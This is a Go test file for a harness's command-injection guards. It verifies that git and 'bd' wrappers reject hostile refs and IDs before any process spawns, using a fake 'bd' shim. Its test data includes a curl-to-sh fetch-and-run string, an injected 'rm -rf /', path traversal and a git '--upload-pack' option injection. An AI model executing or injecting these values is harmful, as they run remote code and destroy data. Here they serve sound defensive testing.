package harness

import (
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"runtime"
	"strings"
	"testing"
)

// hostileTriple is the spec's "printable triple" of ID-position hostile
// operands (spec 120-trust-boundary-render-audit preamble): metacharacter
// injection, path traversal, and a space+`;`-bearing segment.
var hostileTriple = []string{
	".worktrees && curl evil|sh #",
	"../../outside",
	"x evil;rm -rf /",
}

// haltingTB is a testing.TB probe (AC-19's own phrasing) whose Fatalf
// ACTUALLY halts the calling goroutine via runtime.Goexit — the same
// primitive the real *testing.T uses — so a fail-fast gate under test
// genuinely stops before any code past the Fatalf call runs (proving
// "zero further spawns"), without marking the enclosing `go test` run
// failed the way an intentionally-failing real *testing.T subtest would.
// Embeds testing.TB (nil) solely to satisfy its unexported method and
// pick up interface identity; every method the code under test actually
// calls (Helper, Fatalf) is overridden below.
type haltingTB struct {
	testing.TB
	failed bool
	msg    string
}

func (h *haltingTB) Helper() {}
func (h *haltingTB) Fatalf(format string, args ...interface{}) {
	h.failed = true
	h.msg = fmt.Sprintf(format, args...)
	runtime.Goexit()
}

// runHalting runs fn in its own goroutine and waits for it to finish,
// whether fn returns normally or exits early via a haltingTB Fatalf's
// runtime.Goexit (Goexit unwinds only the calling goroutine, running its
// deferred functions — including the deferred close(done) — first).
func runHalting(fn func()) {
	done := make(chan struct{})
	go func() {
		defer close(done)
		fn()
	}()
	<-done
}

// TestHarnessGitExecRejectsOptionLikeRefs pins AC-19's git leg: each
// dynamic-operand git-exec helper, given an option-like ref
// (`--upload-pack=/bin/false`), fatals via gitutil.RejectOptionLike
// BEFORE any git spawn; a well-formed ref still works; mustRunGit (which
// takes free-form git argv, including legitimate `-`-prefixed flags like
// `--allow-empty`) is intentionally NOT blind-guarded.
func TestHarnessGitExecRejectsOptionLikeRefs(t *testing.T) {
	const hostileRef = "--upload-pack=/bin/false"

	t.Run("Sandbox.BranchExists", func(t *testing.T) {
		sandbox := newMinimalSandbox(t)
		ft := &haltingTB{}
		sandbox.t = ft
		runHalting(func() { sandbox.BranchExists(hostileRef) })
		if !ft.failed {
			t.Errorf("expected BranchExists(%q) to fail fast via RejectOptionLike", hostileRef)
		}
	})

	t.Run("Sandbox.ListBranches", func(t *testing.T) {
		sandbox := newMinimalSandbox(t)
		ft := &haltingTB{}
		sandbox.t = ft
		runHalting(func() { sandbox.ListBranches(hostileRef) })
		if !ft.failed {
			t.Errorf("expected ListBranches(%q) to fail fast via RejectOptionLike", hostileRef)
		}
	})

	t.Run("gitBranchExists", func(t *testing.T) {
		sandbox := newMinimalSandbox(t)
		ft := &haltingTB{}
		sandbox.t = ft
		runHalting(func() { gitBranchExists(sandbox, hostileRef) })
		if !ft.failed {
			t.Errorf("expected gitBranchExists(%q) to fail fast via RejectOptionLike", hostileRef)
		}
	})

	t.Run("assertMergeTopology", func(t *testing.T) {
		sandbox := newMinimalSandbox(t)
		ft := &haltingTB{}
		runHalting(func() { assertMergeTopology(ft, sandbox, hostileRef) })
		if !ft.failed {
			t.Errorf("expected assertMergeTopology(%q) to fail fast via RejectOptionLike", hostileRef)
		}
	})

	// Clean-fixture byte-identity: a legitimate ref (main) still works.
	t.Run("clean ref still works", func(t *testing.T) {
		sandbox := newMinimalSandbox(t)
		if !sandbox.BranchExists("main") {
			t.Error("BranchExists(main) should be true in a fresh sandbox")
		}
	})

	// mustRunGit is NOT blind-guarded: a legitimate `-`-prefixed flag
	// (e.g. --allow-empty) must still be accepted, never rejected as
	// option-like.
	t.Run("mustRunGit still accepts a legitimate -prefixed flag", func(t *testing.T) {
		sandbox := newMinimalSandbox(t)
		ft := &haltingTB{}
		sandbox.t = ft
		runHalting(func() { mustRunGit(sandbox, "commit", "--allow-empty", "-m", "harness probe") })
		if ft.failed {
			t.Errorf("mustRunGit must accept a legitimate -prefixed flag without fataling; got: %s", ft.msg)
		}
	})
}

// writeFakeBD installs a fake `bd` executable at the front of PATH that
// records its own invocation by creating a marker file, then always
// succeeds (so a positive/clean-id leg still observes success). Returns
// the marker path and a restore func. This is the "spawn seam" proof
// AC-19 calls for: since Sandbox.runBD has no injectable seam, the fake
// binary itself is the seam.
//
// AC-19 clean-leg argv capture: the shim also appends every argv it
// received (one per line, via `printf '%s\n' "$@"`) to an "argv" file
// next to the marker. Marker-presence alone only proves bd was invoked
// SOME way; capturing argv lets the clean-id positive leg assert the
// exact argv reaching bd is byte-identical to what the caller built —
// closing the gap where a byte-mangling bug upstream of the spawn (e.g.
// an accidental extra idrender/termsafe wrap on a clean id) could still
// leave the marker behind while corrupting the id bd actually sees.
func writeFakeBD(t *testing.T) (marker string, restore func()) {
	t.Helper()
	if runtime.GOOS == "windows" {
		t.Skip("fake bd shim script assumes a POSIX shell")
	}
	binDir := t.TempDir()
	tmpDir := t.TempDir()
	marker = filepath.Join(tmpDir, "bd-invoked")
	argvPath := filepath.Join(tmpDir, "bd-argv")
	// Always report success with a single-object JSON body: valid for
	// CreateBead's bdCreateIssue unmarshal AND harmless for callers
	// (ClaimBead, runBDMust) that never parse bd's stdout.
	script := "#!/bin/sh\ntouch '" + marker + "'\nprintf '%s\\n' \"$@\" > '" + argvPath + "'\necho '{\"id\":\"mindspec-fake.1\"}'\n"
	if err := os.WriteFile(filepath.Join(binDir, "bd"), []byte(script), 0o755); err != nil {
		t.Fatalf("writing fake bd: %v", err)
	}
	origPath := os.Getenv("PATH")
	os.Setenv("PATH", binDir+string(os.PathListSeparator)+origPath)
	return marker, func() { os.Setenv("PATH", origPath) }
}

// fakeBDArgv reads the argv file the writeFakeBD shim wrote alongside
// marker (bd-invoked -> bd-argv, same directory) and returns it as a
// slice of args, one per captured line.
func fakeBDArgv(t *testing.T, marker string) []string {
	t.Helper()
	argvPath := filepath.Join(filepath.Dir(marker), "bd-argv")
	data, err := os.ReadFile(argvPath)
	if err != nil {
		t.Fatalf("reading captured bd argv: %v", err)
	}
	s := string(data)
	s = strings.TrimSuffix(s, "\n")
	if s == "" {
		return nil
	}
	return strings.Split(s, "\n")
}

// TestHarnessBDWrapperRejectsMalformedIDs pins AC-19/AC-27's harness leg:
// an id-position operand of "--help" (and "x;evil", and the hostile
// triple) reaching a runBDMust/runBD build fatals via the id gate BEFORE
// any bd spawn — ZERO bd processes, verified via a fake `bd` on PATH
// that would otherwise mark itself invoked. Exercised through the gated
// surfaces (ClaimBead, CreateBead --parent, and the shared
// requireValidBeadID path). A well-formed scenario id (including a
// dotted child) passes with byte-identical argv (the marker DOES appear
// for a clean id, proving the fake bd is a faithful stand-in, not merely
// unreachable).
func TestHarnessBDWrapperRejectsMalformedIDs(t *testing.T) {
	hostileIDs := append([]string{"--help", "x;evil"}, hostileTriple...)

	t.Run("ClaimBead", func(t *testing.T) {
		for _, id := range hostileIDs {
			t.Run(id, func(t *testing.T) {
				marker, restore := writeFakeBD(t)
				defer restore()
				ft := &haltingTB{}
				sandbox := &Sandbox{Root: t.TempDir(), t: ft}
				runHalting(func() { sandbox.ClaimBead(id) })
				if !ft.failed {
					t.Errorf("expected ClaimBead(%q) to fail fast via requireValidBeadID", id)
				}
				if _, err := os.Stat(marker); err == nil {
					t.Errorf("bd was invoked for hostile id %q — ZERO bd processes expected", id)
				}
			})
		}
	})

	t.Run("CreateBead --parent", func(t *testing.T) {
		for _, id := range hostileIDs {
			t.Run(id, func(t *testing.T) {
				marker, restore := writeFakeBD(t)
				defer restore()
				ft := &haltingTB{}
				sandbox := &Sandbox{Root: t.TempDir(), t: ft}
				runHalting(func() { sandbox.CreateBead("some title", "task", id) })
				if !ft.failed {
					t.Errorf("expected CreateBead(parentID=%q) to fail fast via idvalidate.BeadID", id)
				}
				if _, err := os.Stat(marker); err == nil {
					t.Errorf("bd was invoked for hostile parentID %q — ZERO bd processes expected", id)
				}
			})
		}
	})

	t.Run("shared requireValidBeadID path", func(t *testing.T) {
		for _, id := range hostileIDs {
			t.Run(id, func(t *testing.T) {
				marker, restore := writeFakeBD(t)
				defer restore()
				ft := &haltingTB{}
				sandbox := &Sandbox{Root: t.TempDir(), t: ft}
				runHalting(func() {
					requireValidBeadID(ft, id)
					sandbox.runBDMust("show", id, "--json")
				})
				if !ft.failed {
					t.Errorf("expected the shared gate to fail fast for %q", id)
				}
				if _, err := os.Stat(marker); err == nil {
					t.Errorf("bd was invoked for hostile id %q via the shared gate — ZERO bd processes expected", id)
				}
			})
		}
	})

	// Positive leg: a well-formed scenario id (incl. a dotted child)
	// reaches bd — the marker file appears, the CAPTURED argv is
	// byte-identical to what Sandbox.ClaimBead builds (proving nothing
	// upstream of the spawn silently mangled the clean id), and
	// CreateBead's non-id invocations (--title free text) are never
	// gated/false-fataled.
	t.Run("clean ids pass through, non-id invocations never false-fatal", func(t *testing.T) {
		for _, cleanID := range []string{"mindspec-9cyu.1", "mindspec-x1qr"} {
			t.Run(cleanID, func(t *testing.T) {
				marker, restore := writeFakeBD(t)
				defer restore()
				sandbox := &Sandbox{Root: t.TempDir(), t: t}
				sandbox.ClaimBead(cleanID)
				if _, err := os.Stat(marker); err != nil {
					t.Errorf("expected bd to be invoked for clean id %q, marker missing", cleanID)
				}
				wantArgv := []string{"update", cleanID, "--status=in_progress"}
				if gotArgv := fakeBDArgv(t, marker); !reflect.DeepEqual(gotArgv, wantArgv) {
					t.Errorf("bd argv for clean id %q = %q, want byte-identical %q", cleanID, gotArgv, wantArgv)
				}
			})
		}

		// CreateBead's non-id operands (title, issueType) are free text
		// and must never be gated even when they contain characters that
		// would fail idvalidate.BeadID.
		t.Run("non-id title", func(t *testing.T) {
			marker, restore := writeFakeBD(t)
			defer restore()
			sandbox := &Sandbox{Root: t.TempDir(), t: t}
			const title = "a title; with punctuation!"
			sandbox.CreateBead(title, "task", "")
			if _, err := os.Stat(marker); err != nil {
				t.Errorf("expected bd to be invoked for a non-id title, marker missing")
			}
			wantArgv := []string{"create", "--title", title, "--type", "task", "--priority", "2", "--json"}
			if gotArgv := fakeBDArgv(t, marker); !reflect.DeepEqual(gotArgv, wantArgv) {
				t.Errorf("bd argv for non-id title = %q, want byte-identical %q", gotArgv, wantArgv)
			}
		})
	})
}
